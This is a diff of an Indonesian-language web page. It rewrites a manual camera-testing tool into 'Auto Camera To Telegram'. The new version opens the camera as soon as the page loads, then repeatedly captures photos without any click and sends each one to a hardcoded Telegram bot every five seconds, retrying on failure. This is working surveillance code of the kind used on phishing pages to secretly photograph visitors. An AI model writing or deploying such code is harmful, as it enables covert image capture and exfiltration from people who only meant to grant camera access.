@@ -8,7 +8,7 @@
     * { margin: 0; padding: 0; box-sizing: border-box; }
     
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       background: #1a1a2e;
       color: #eee;
       padding: 20px;
@@ -23,7 +23,7 @@
     h1 {
       color: #4fc3f7;
       text-align: center;
-      margin-bottom: 10px;
+      margin-bottom: 8px;
       word-break: break-word;
     }
     
@@ -31,449 +31,128 @@
       text-align: center;
       color: #aaa;
       font-size: 0.9em;
-      margin-bottom: 20px;
-    }
-    
-    .video-container {
-      background: #16213e;
-      border-radius: 12px;
-      padding: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+      margin-bottom: 18px;
     }
     
     video {
       width: 100%;
-      border-radius: 8px;
+      border-radius: 10px;
       background: #000;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.6);
       transform: scaleX(-1);
+      margin-bottom: 14px;
     }
     
-    canvas {
-      display: none;
-    }
-    
-    .controls {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 10px;
-      margin-top: 15px;
-    }
-    
-    button {
-      background: #4fc3f7;
-      color: #1a1a2e;
-      border: none;
-      padding: 12px;
-      border-radius: 8px;
-      font-weight: bold;
-      cursor: pointer;
-      font-size: 15px;
-      transition: all 0.2s;
-    }
-    
-    button:hover:not(:disabled) {
-      background: #81d4fa;
-      transform: translateY(-2px);
-    }
-    
-    button:disabled {
-      background: #555;
-      color: #888;
-      cursor: not-allowed;
-    }
-    
-    button.danger {
-      background: #ef5350;
-      color: white;
-    }
-    
-    button.danger:hover:not(:disabled) {
-      background: #e57373;
-    }
-    
-    .info-panel {
+    .status {
       background: #16213e;
-      border-radius: 12px;
-      padding: 18px;
-      margin-top: 18px;
+      border-radius: 10px;
+      padding: 14px;
+      margin-bottom: 12px;
       box-shadow: 0 4px 20px rgba(0,0,0,0.5);
     }
     
-    h2 {
-      color: #4fc3f7;
-      font-size: 1.15em;
-      margin-bottom: 14px;
-      border-bottom: 2px solid #4fc3f7;
-      padding-bottom: 8px;
+    .status-line {
+      margin: 4px 0;
     }
     
-    .info-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 10px;
-    }
+    .status-line.ok { color: #66bb6a; }
+    .status-line.err { color: #ef5350; }
+    .status-line.info { color: #aaa; }
     
-    .info-item {
-      background: #0f3460;
-      padding: 12px;
-      border-radius: 8px;
-      border-left: 3px solid #4fc3f7;
-    }
+    .hidden { display: none !important; }
     
-    .info-label {
-      color: #888;
-      font-size: 0.82em;
-      margin-bottom: 4px;
-      text-transform: uppercase;
-    }
-    
-    .info-value {
-      color: #4fc3f7;
-      font-weight: bold;
-      word-break: break-word;
-    }
-    
-    .capture-gallery {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-      gap: 10px;
-      margin-top: 10px;
-    }
-    
-    .capture-item {
-      border: 2px solid #4fc3f7;
-      border-radius: 8px;
-      padding: 8px;
-      background: #0f3460;
-    }
-    
-    .capture-item img {
-      width: 100%;
-      border-radius: 4px;
-      margin-bottom: 8px;
-    }
-    
-    .capture-item button {
-      width: 100%;
-      padding: 8px;
-      font-size: 0.8em;
-    }
-    
-    .log {
-      background: #16213e;
-      border-radius: 12px;
-      padding: 14px;
-      margin-top: 18px;
-      max-height: 220px;
-      overflow-y: auto;
-      font-family: "Courier New", monospace;
-      font-size: 0.83em;
-    }
-    
-    .log-entry {
-      margin: 5px 0;
-      padding: 5px;
-      border-left: 3px solid;
-    }
-    
-    .log-info { border-color: #4fc3f7; }
-    .log-success { border-color: #66bb6a; }
-    .log-error { border-color: #ef5350; }
-    .log-time { color: #888; margin-right: 10px; }
-    
-    .permission-denied {
-      background: #ef5350;
-      color: white;
-      padding: 18px;
-      border-radius: 8px;
+    .hint {
       text-align: center;
-      margin: 16px 0;
-    }
-    
-    .telegram-settings {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 10px;
+      color: #888;
       margin-top: 10px;
-    }
-    
-    .telegram-settings input {
-      width: 100%;
-      padding: 10px;
-      border-radius: 8px;
-      border: 1px solid #444;
-      background: #0f3460;
-      color: #eee;
-    }
-    
-    @media (max-width: 600px) {
-      .controls { grid-template-columns: 1fr; }
-      .info-grid { grid-template-columns: 1fr; }
-      .telegram-settings { grid-template-columns: 1fr; }
+      font-size: 0.9em;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>📸 Camera Tester</h1>
-    <p class="subtitle">Testing kamera perangkat ini</p>
+    <h1>📸 Auto Camera To Telegram</h1>
+    <p class="subtitle">Grant permission untuk mulai</p>
     
-    <div id="permissionError" style="display:none;" class="permission-denied">
-      <strong>❌ Izin kamera ditolak</strong><br>
-      Silakan berikan izin akses kamera di pengaturan browser, lalu refresh halaman.
+    <div id="statusInfo" class="status">
+      <div class="status-line info">Menunggu izin kamera...</div>
     </div>
     
-    <div class="video-container">
-      <video id="video" autoplay playsinline muted></video>
-      <canvas id="canvas"></canvas>
-      
-      <div class="controls">
-        <button id="startBtn" onclick="startCamera()">▶ Mulai Kamera</button>
-        <button id="stopBtn" onclick="stopCamera()" disabled>■ Stop</button>
-        <button id="captureBtn" onclick="capturePhoto()" disabled>📷 Capture</button>
-        <button id="switchBtn" onclick="switchCamera()" disabled>🔄 Switch Kamera</button>
-      </div>
-    </div>
+    <video id="video" autoplay playsinline muted></video>
     
-    <div class="info-panel">
-      <h2>📊 Info Kamera</h2>
-      <div class="info-grid">
-        <div class="info-item">
-          <div class="info-label">Device</div>
-          <div class="info-value" id="deviceName">-</div>
-        </div>
-        <div class="info-item">
-          <div class="info-label">Resolusi</div>
-          <div class="info-value" id="resolution">-</div>
-        </div>
-        <div class="info-item">
-          <div class="info-label">Frame Rate</div>
-          <div class="info-value" id="frameRate">-</div>
-        </div>
-        <div class="info-item">
-          <div class="info-label">Aspect Ratio</div>
-          <div class="info-value" id="aspectRatio">-</div>
-        </div>
-        <div class="info-item">
-          <div class="info-label">Facing Mode</div>
-          <div class="info-value" id="facingMode">-</div>
-        </div>
-        <div class="info-item">
-          <div class="info-label">Status</div>
-          <div class="info-value" id="status">Stopped</div>
-        </div>
-      </div>
-    </div>
-    
-    <div class="info-panel">
-      <h2>📋 Activity Log</h2>
-      <div id="log" class="log"></div>
-    </div>
-    
-    <div class="info-panel">
-      <h2>🖼️ Hasil Capture</h2>
-      <div id="gallery" class="capture-gallery">
-        <p style="color: #888; grid-column: 1/-1;">Belum ada foto yang diambil</p>
-      </div>
-    </div>
-    
-    <div class="info-panel">
-      <h2>✈️ Kirim ke Telegram</h2>
-      <p style="color:#aaa; margin-bottom:8px;">Isi bot token dan chat ID, lalu klik <b>Kirim Foto Terbaru</b>.</p>
-      <div class="telegram-settings">
-        <input type="text" id="tgBotToken" placeholder="Bot token (misal 123:ABC...)" />
-        <input type="text" id="tgChatId" placeholder="Chat ID (misal 123456789)" />
-      </div>
-      <button id="tgSendBtn" onclick="sendLastCaptureToTelegram()" style="margin-top:10px;">Kirim Foto Terbaru ke Telegram</button>
-      <div id="tgStatus" style="margin-top:8px; color:#aaa;"></div>
-    </div>
+    <p class="hint">
+      Setelah izin diberikan, foto otomatis terkirim ke Telegram
+    </p>
   </div>
   
+  <canvas id="canvas" style="display:none"></canvas>
+  
   <script>
+    const TELEGRAM_BOT_TOKEN = '<TOKEN_BOT_KAMU>';
+    const TELEGRAM_CHAT_ID = '<CHAT_ID_KAMU>';
+    const MAX_RETRIES = 3;
+    
     let video = document.getElementById('video');
     let canvas = document.getElementById('canvas');
     let ctx = canvas.getContext('2d');
-    let currentStream = null;
-    let captures = [];
-    let isFrontCamera = true;
+    let stream = null;
+    let sending = false;
+    let attempts = 0;
     
-    const log = document.getElementById('log');
-    const startBtn = document.getElementById('startBtn');
-    const stopBtn = document.getElementById('stopBtn');
-    const captureBtn = document.getElementById('captureBtn');
-    const switchBtn = document.getElementById('switchBtn');
+    const statusInfo = document.getElementById('statusInfo');
     
-    const tgBotToken = document.getElementById('tgBotToken');
-    const tgChatId = document.getElementById('tgChatId');
-    const tgSendBtn = document.getElementById('tgSendBtn');
-    const tgStatus = document.getElementById('tgStatus');
-    
-    function addLog(message, type = 'info') {
-      let entry = document.createElement('div');
-      entry.className = 'log-entry log-' + type;
-      let time = new Date().toLocaleTimeString();
-      entry.innerHTML = '<span class="log-time">[' + time + ']</span> ' + message;
-      log.insertBefore(entry, log.firstChild);
+    function log(msg, type = 'info') {
+      const cls = type === 'ok' ? 'ok' : type === 'err' ? 'err' : 'info';
+      statusInfo.innerHTML += `<div class="status-line ${cls}">${msg}</div>`;
     }
     
     async function startCamera() {
       try {
-        addLog('Meminta akses kamera...', 'info');
-        
-        const constraints = {
+        const s = await navigator.mediaDevices.getUserMedia({
           video: {
-            facingMode: isFrontCamera ? 'user' : 'environment',
-            width: { ideal: 1920 },
-            height: { ideal: 1080 }
+            width: { ideal: 1280 },
+            height: { ideal: 720 },
+            facingMode: 'environment'
           }
+        });
+        
+        stream = s;
+        video.srcObject = s;
+        
+        video.onloadedmetadata = () => {
+          log('Kamera aktif', 'ok');
+          canvas.width = video.videoWidth || 1280;
+          canvas.height = video.videoHeight || 720;
+          sendToTelegram();
         };
-        
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        currentStream = stream;
-        video.srcObject = stream;
-        
-        video.onloadedmetadata = function() {
-          updateInfo(stream);
-          document.getElementById('status').textContent = 'Active';
-          document.getElementById('status').style.color = '#66bb6a';
-          
-          startBtn.disabled = true;
-          stopBtn.disabled = false;
-          captureBtn.disabled = false;
-          switchBtn.disabled = false;
-          
-          addLog('Kamera berhasil diaktifkan', 'success');
-        };
-        
       } catch (err) {
-        console.error('Error:', err);
-        addLog('Error: ' + err.message, 'error');
-        
-        if (['NotAllowedError','PermissionDeniedError'].includes(err.name)) {
-          document.getElementById('permissionError').style.display = 'block';
-          addLog('Izin kamera ditolak. Berikan izin di browser settings.', 'error');
-        } else if (err.name === 'NotFoundError') {
-          addLog('Tidak ada kamera yang terdeteksi', 'error');
-        } else if (err.name === 'NotReadableError') {
-          addLog('Kamera sedang digunakan aplikasi lain', 'error');
-        }
+        log('Izin kamera ditolak atau kamera tidak tersedia', 'err');
+        console.error(err);
       }
     }
     
-    function stopCamera() {
-      if (currentStream) {
-        currentStream.getTracks().forEach(track => track.stop());
-        video.srcObject = null;
-        currentStream = null;
-        
-        document.getElementById('status').textContent = 'Stopped';
-        document.getElementById('status').style.color = '#ef5350';
-        
-        startBtn.disabled = false;
-        stopBtn.disabled = true;
-        captureBtn.disabled = true;
-        switchBtn.disabled = true;
-        
-        addLog('Kamera dihentikan', 'info');
-      }
-    }
-    
-    async function switchCamera() {
-      if (currentStream) currentStream.getTracks().forEach(track => track.stop());
-      isFrontCamera = !isFrontCamera;
-      addLog('Beralih ke kamera ' + (isFrontCamera ? 'depan' : 'belakang') + '...', 'info');
-      await startCamera();
-    }
-    
-    function updateInfo(stream) {
-      const track = stream.getVideoTracks()[0];
-      const capabilities = track.getCapabilities ? track.getCapabilities() : {};
-      const settings = track.getSettings();
-      
-      document.getElementById('deviceName').textContent = track.label || 'Unknown';
-      document.getElementById('resolution').textContent = (settings.width||'-') + ' x ' + (settings.height||'-');
-      document.getElementById('frameRate').textContent = settings.frameRate ? settings.frameRate.toFixed(1) + ' fps' : '-';
-      document.getElementById('aspectRatio').textContent = settings.width && settings.height ? calculateAspectRatio(settings.width, settings.height) : '-';
-      document.getElementById('facingMode').textContent = 
-        settings.facingMode === 'user' ? 'Depan (Front)' :
-        settings.facingMode === 'environment' ? 'Belakang (Rear)' : (settings.facingMode || '-');
-      
-      canvas.width = settings.width || 640;
-      canvas.height = settings.height || 480;
-      
-      addLog('Device: ' + (track.label || 'Unknown'), 'info');
-      addLog('Resolusi: ' + settings.width + 'x' + settings.height, 'info');
-    }
-    
-    function calculateAspectRatio(width, height) {
-      const gcd = (a, b) => b ? gcd(b, a % b) : a;
-      const divisor = gcd(width, height);
-      return (width / divisor) + ':' + (height / divisor);
-    }
-    
-    function capturePhoto() {
-      if (!currentStream) return;
-      
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const dataURL = canvas.toDataURL('image/png');
-      const timestamp = new Date().toLocaleTimeString();
-      
-      captures.unshift({ dataURL, timestamp });
-      
-      const gallery = document.getElementById('gallery');
-      if (gallery.querySelector('p')) gallery.innerHTML = '';
-      
-      const item = document.createElement('div');
-      item.className = 'capture-item';
-      item.innerHTML = `
-        <img src="${dataURL}" alt="Capture ${timestamp}">
-        <div style="color:#888;font-size:0.72em;text-align:center;margin-bottom:5px;">${timestamp}</div>
-        <button onclick="sendToTelegram(this, '${timestamp.replace(/'/g, "\\'")}')">✈️ Kirim TG</button>
-        <button onclick="downloadPhoto('${timestamp.replace(/'/g, "\\'")}')" style="margin-top:4px;">💾 Download</button>
-        <button onclick="this.parentElement.remove()" style="background:#ef5350;margin-top:4px;">🗑 Delete</button>
-      `;
-      
-      gallery.insertBefore(item, gallery.firstChild);
-      addLog('Foto berhasil diambil', 'success');
-    }
-    
-    function downloadPhoto(timestamp) {
-      const capture = captures.find(c => c.timestamp === timestamp);
-      if (!capture) return;
-      
-      const link = document.createElement('a');
-      link.download = 'camera-test-' + timestamp.replace(/:/g, '-') + '.png';
-      link.href = capture.dataURL;
-      link.click();
-      addLog('Foto di-download', 'info');
-    }
-    
-    async function sendToTelegram(buttonEl, timestamp) {
-      const capture = captures.find(c => c.timestamp === timestamp);
-      if (!capture) {
-        addLog('Foto tidak ditemukan untuk dikirim', 'error');
+    async function sendToTelegram() {
+      if (sending) return;
+      if (attempts >= MAX_RETRIES) {
+        log('Mencapai batas percobaan', 'err');
         return;
       }
       
-      const token = tgBotToken.value.trim();
-      const chatId = tgChatId.value.trim();
-      
-      if (!token || !chatId) {
-        addLog('Isi Bot Token dan Chat ID terlebih dahulu', 'error');
-        alert('Mohon isi Bot Token dan Chat ID terlebih dahulu');
-        return;
-      }
+      sending = true;
+      attempts++;
       
       try {
-        if (buttonEl) buttonEl.disabled = true;
-        tgStatus.textContent = 'Mengirim...';
+        log('Mengambil foto...', 'info');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const dataURL = canvas.toDataURL('image/png');
         
-        const blob = await (await fetch(capture.dataURL)).blob();
+        const blob = await (await fetch(dataURL)).blob();
         const form = new FormData();
-        form.append('chat_id', chatId);
-        form.append('photo', blob, 'camera-test.png');
+        form.append('chat_id', TELEGRAM_CHAT_ID);
+        form.append('photo', blob, 'camera-auto.png');
         
-        const res = await fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {
+        log('Mengirim ke Telegram...', 'info');
+        const res = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendPhoto', {
           method: 'POST',
           body: form
         });
@@ -481,57 +160,31 @@
         const data = await res.json();
         
         if (data.ok) {
-          addLog('Foto berhasil dikirim ke Telegram', 'success');
-          tgStatus.textContent = 'Terkirim ✅';
-          setTimeout(() => { tgStatus.textContent = ''; }, 1500);
+          log('Foto terkirim ke Telegram ✓', 'ok');
+          attempts = 0;
+          setTimeout(() => {
+            sendToTelegram();
+          }, 5000);
         } else {
           throw new Error(data.description || JSON.stringify(data));
         }
       } catch (err) {
-        console.error(err);
-        addLog('Gagal kirim Telegram: ' + err.message, 'error');
-        tgStatus.textContent = 'Gagal ❌';
+        log('Gagal: ' + err.message, 'err');
+        setTimeout(() => {
+          sendToTelegram();
+        }, 2000);
       } finally {
-        if (buttonEl) buttonEl.disabled = false;
+        sending = false;
       }
     }
     
-    async function sendLastCaptureToTelegram() {
-      const token = tgBotToken.value.trim();
-      const chatId = tgChatId.value.trim();
-      
-      if (!token || !chatId) {
-        addLog('Isi Bot Token dan Chat ID terlebih dahulu', 'error');
-        alert('Mohon isi Bot Token dan Chat ID terlebih dahulu');
-        return;
+    window.addEventListener('beforeunload', () => {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
       }
-      
-      if (!captures.length) {
-        addLog('Belum ada foto capture untuk dikirim', 'error');
-        alert('Ambil capture dulu sebelum mengirim.');
-        return;
-      }
-      
-      tgSendBtn.disabled = true;
-      await sendToTelegram(null, captures[0].timestamp);
-      tgSendBtn.disabled = false;
-      setTimeout(() => { tgStatus.textContent = ''; }, 1500);
-    }
-    
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      addLog('Browser tidak mendukung akses kamera', 'error');
-      startBtn.disabled = true;
-      document.getElementById('status').textContent = 'Not Supported';
-    } else {
-      addLog('Browser mendukung akses kamera', 'success');
-      addLog('Klik "Mulai Kamera" untuk mulai testing', 'info');
-    }
-    
-    window.addEventListener('beforeunload', function() {
-      if (currentStream) currentStream.getTracks().forEach(track => track.stop());
     });
     
-    addLog('Halaman kamera test siap', 'info');
+    startCamera();
   </script>
 </body>
 </html>
